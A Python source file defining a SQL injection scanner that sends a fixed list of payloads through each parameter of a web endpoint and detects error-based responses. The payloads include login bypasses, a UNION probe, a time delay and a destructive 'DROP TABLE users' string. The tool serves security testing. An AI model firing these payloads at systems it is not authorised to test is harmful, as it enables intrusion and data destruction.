"""
Dynamic SQL injection tester. Cross-platform; uses requests with timeouts.
"""
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin

import requests


class DynamicSQLiTester:
    def __init__(self, target_url: str, timeout: float = 10.0, verify_ssl: bool = True) -> None:
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL --",
            "1' OR '1'='1' --",
            "1 OR 1=1",
            "admin'--",
            "' OR 1=1--",
            "1; SELECT pg_sleep(5)--",
        ]

    def is_vulnerable(self, response: requests.Response, param: str, payload: str) -> bool:
        text = (response.text or "").lower()
        # Error-based indicators (cross-DB common messages)
        error_indicators = [
            "sql syntax",
            "syntax error",
            "mysql_fetch",
            "pg_query",
            "sqlite_",
            "ora-01",
            "unclosed quotation",
            "quoted string not properly terminated",
            "unexpected end of sql",
            "warning: mysql",
            "valid mysql result",
            "myisam",
            "mysqli",
            "postgresql",
            "sqlstate",
        ]
        for indicator in error_indicators:
            if indicator in text:
                return True
        # Optional: compare with baseline (no payload) response length/content
        return False

    def test_endpoint(
        self,
        endpoint: str,
        params: Dict[str, str],
        method: str = "POST",
        headers: Optional[Dict[str, str]] = None,
    ) -> List[Dict[str, Any]]:
        vulnerabilities: List[Dict[str, Any]] = []
        url = endpoint if endpoint.startswith("http") else urljoin(self.target_url + "/", endpoint)
        headers = headers or {"Content-Type": "application/x-www-form-urlencoded"}

        for param in params:
            for payload in self.payloads:
                test_params = dict(params)
                test_params[param] = payload
                try:
                    if method.upper() == "POST":
                        response = self.session.post(
                            url, data=test_params, headers=headers, timeout=self.timeout
                        )
                    else:
                        response = self.session.get(
                            url, params=test_params, headers=headers, timeout=self.timeout
                        )
                    if self.is_vulnerable(response, param, payload):
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": payload,
                            "endpoint": url,
                            "status_code": response.status_code,
                        })
                except requests.RequestException:
                    continue
        return vulnerabilities
